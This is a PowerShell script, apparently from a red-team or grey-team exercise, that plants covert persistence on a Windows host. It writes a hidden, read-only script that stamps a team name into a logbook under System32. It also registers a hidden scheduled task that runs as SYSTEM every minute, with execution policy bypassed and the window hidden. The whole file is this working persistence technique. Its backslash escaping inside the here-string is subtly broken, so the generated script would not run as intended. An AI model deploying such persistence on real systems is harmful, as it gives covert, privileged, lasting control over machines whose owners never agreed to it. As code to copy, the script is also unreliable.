# Customize these variables:
$party = "The Delta Knights"                # Name of the party to be logged
$logbookPath = "C:\Windows\System32\grey-team\logbook.txt"  # Corrected path
$updateScriptPath = "$env:ProgramData\.update_logbook.ps1"  # Path for the hidden update script
$taskName = "LogbookUpdateTask"        # Task name for the scheduled task

# Ensure the directory exists
$logbookDir = Split-Path -Path $logbookPath -Parent
if (-not (Test-Path $logbookDir)) {
    New-Item -Path $logbookDir -ItemType Directory -Force | Out-Null
}

# Step 1: Create the hidden update script that changes the first line of the logbook
$updateScriptContent = @"
# PowerShell script to update the logbook with the party's name.
\$party = '$party'  
\$logbookPath = '$logbookPath'

# Create the file if it doesn't exist
if (-not (Test-Path \$logbookPath)) {
    New-Item -Path \$logbookPath -ItemType File -Force | Out-Null
    Set-Content -Path \$logbookPath -Value \$party
} else {
    # Read the logbook, modify the first line, and write it back
    \$content = Get-Content -Path \$logbookPath -ErrorAction SilentlyContinue
    if (\$content.Count -eq 0) {
        Set-Content -Path \$logbookPath -Value \$party
    } else {
        \$content[0] = \$party
        Set-Content -Path \$logbookPath -Value \$content
    }
}
"@

# Create the update script as a hidden file
$updateScriptContent | Out-File -FilePath $updateScriptPath -Force

# Make the update script hidden by setting its attribute
Set-ItemProperty -Path $updateScriptPath -Name Attributes -Value "Hidden, ReadOnly"

Write-Host "Hidden update script has been created."

# Step 2: Create a scheduled task to run the update script every minute
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$updateScriptPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$trigger.RepetitionInterval = New-TimeSpan -Minutes 1
$trigger.RepetitionDuration = New-TimeSpan -Days 1

# Create the scheduled task to run under SYSTEM account (to run with elevated privileges)
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteriesLow $true -DontStopIfGoingOnBatteries $true -Hidden $true
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register the scheduled task
Register-ScheduledTask -Action $action -Principal $taskPrincipal -Trigger $trigger -Settings $taskSettings -TaskName $taskName -Force

Write-Host "Secret scheduled task to update logbook has been created."
